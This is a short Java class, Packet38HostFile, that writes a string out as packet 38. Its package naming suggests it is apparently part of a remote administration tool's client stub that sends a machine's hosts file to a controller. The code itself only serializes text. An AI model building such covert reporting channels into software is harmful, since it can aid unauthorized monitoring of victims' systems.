package com.redpois0n.stub.stub.packets.outgoing;

import java.io.DataOutputStream;

import com.redpois0n.common.io.StringWriter;

public class Packet38HostFile extends AbstractOutgoingPacket {
	
	private String content;
	
	public Packet38HostFile(String content) {
		this.content = content;
	}

	@Override
	public void write(DataOutputStream dos, StringWriter sw) throws Exception {
		sw.writeLine(content);
	}

	@Override
	public byte getPacketId() {
		return 38;
	}

}
